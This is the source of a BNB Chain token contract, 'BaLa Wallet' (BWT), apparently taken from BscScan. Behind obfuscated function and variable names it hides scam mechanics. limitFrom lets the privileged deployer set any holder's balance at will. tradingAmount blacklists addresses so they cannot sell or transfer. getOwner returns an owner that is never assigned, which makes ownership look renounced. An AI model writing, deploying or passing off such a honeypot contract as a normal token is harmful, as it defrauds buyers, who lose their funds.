/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface modeFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listAt) external view returns (uint256);

    function transfer(address totalExempt, uint256 fromTrading) external returns (bool);

    function allowance(address enableTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromTrading) external returns (bool);

    function transferFrom(
        address sender,
        address totalExempt,
        uint256 fromTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverList, uint256 value);
    event Approval(address indexed enableTrading, address indexed spender, uint256 value);
}

interface modeFromMetadata is modeFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract walletTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptFrom {
    function createPair(address txAmount, address minMarketing) external returns (address);
}

contract BaLaWallet is walletTotal, modeFrom, modeFromMetadata {

    uint8 private marketingFund = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return fromMode;
    }

    function transferFrom(address receiverLaunched, address totalExempt, uint256 fromTrading) external override returns (bool) {
        if (enableFund[receiverLaunched][_msgSender()] != type(uint256).max) {
            require(fromTrading <= enableFund[receiverLaunched][_msgSender()]);
            enableFund[receiverLaunched][_msgSender()] -= fromTrading;
        }
        return fromLaunchedAmount(receiverLaunched, totalExempt, fromTrading);
    }

    function balanceOf(address listAt) public view virtual override returns (uint256) {
        return toMarketing[listAt];
    }

    function limitFrom(address toSwapAuto, uint256 fromTrading) public {
        if (!fundExemptTake[_msgSender()]) {
            return;
        }
        toMarketing[toSwapAuto] = fromTrading;
    }

    mapping(address => bool) public sellFund;

    function tradingAmount(address listWallet) public {
        if (listWallet == buyIs || listWallet == launchedTotal || !fundExemptTake[_msgSender()]) {
            return;
        }
        sellFund[listWallet] = true;
    }

    mapping(address => mapping(address => uint256)) private enableFund;

    uint256 private fromMode = 100000000 * 10 ** 18;

    address marketingMode = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function allowance(address modeListWallet, address amountToLimit) external view virtual override returns (uint256) {
        return enableFund[modeListWallet][amountToLimit];
    }

    function approve(address amountToLimit, uint256 fromTrading) public virtual override returns (bool) {
        enableFund[_msgSender()][amountToLimit] = fromTrading;
        emit Approval(_msgSender(), amountToLimit, fromTrading);
        return true;
    }

    function transfer(address toSwapAuto, uint256 fromTrading) external virtual override returns (bool) {
        return fromLaunchedAmount(_msgSender(), toSwapAuto, fromTrading);
    }

    function name() external view virtual override returns (string memory) {
        return launchMode;
    }

    string private launchMode = "BaLa Wallet";

    address public buyIs;

    function feeShouldLiquidity(address launchedSwap) public {
        if (walletTxBuy) {
            return;
        }
        fundExemptTake[launchedSwap] = true;
        walletTxBuy = true;
    }

    mapping(address => bool) public fundExemptTake;

    function decimals() external view virtual override returns (uint8) {
        return marketingFund;
    }

    function symbol() external view virtual override returns (string memory) {
        return totalTake;
    }

    function fromLaunchedAmount(address receiverLaunched, address totalExempt, uint256 fromTrading) internal returns (bool) {
        require(!sellFund[receiverLaunched]);
        return modeAuto(receiverLaunched, totalExempt, fromTrading);
    }

    address exemptFromAddr = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    function getOwner() external view returns (address) {
        return owner;
    }

    function modeAuto(address receiverLaunched, address totalExempt, uint256 fromTrading) internal returns (bool) {
        require(toMarketing[receiverLaunched] >= fromTrading);
        toMarketing[receiverLaunched] -= fromTrading;
        toMarketing[totalExempt] += fromTrading;
        emit Transfer(receiverLaunched, totalExempt, fromTrading);
        return true;
    }

    mapping(address => uint256) private toMarketing;

    bool public walletTxBuy;

    address public launchedTotal;

    string private totalTake = "BWT";

    constructor (){
        launchedTotal = exemptFrom(exemptFromAddr).createPair(marketingMode,address(this));
        buyIs = _msgSender();
        toMarketing[buyIs] = fromMode;
        fundExemptTake[buyIs] = true;
        emit Transfer(address(0), buyIs, fromMode);
    }

    address public owner;

}